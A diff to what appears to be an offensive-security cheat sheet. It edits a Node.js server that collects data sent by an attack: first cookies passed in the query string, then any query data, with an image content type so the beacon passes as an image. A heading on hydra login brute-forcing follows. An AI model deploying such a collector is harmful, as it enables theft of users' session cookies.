@@ -118,9 +118,12 @@ const url = require('url');
 
 http.createServer((req, res) => {
   const queryObject = url.parse(req.url, true).query;
-  console.log('Cookies: ', queryObject.cookie);
-  res.end('Logged');
-}).listen(5555);
+  console.log('Received Data:', queryObject);
+  res.writeHead(200, { 'Content-Type': 'image/png' });
+  res.end('');
+}).listen(5555, () => {
+  console.log('Server listening on port 5555');
+});
 ```
 
 ## Login brute-force with `hydra`
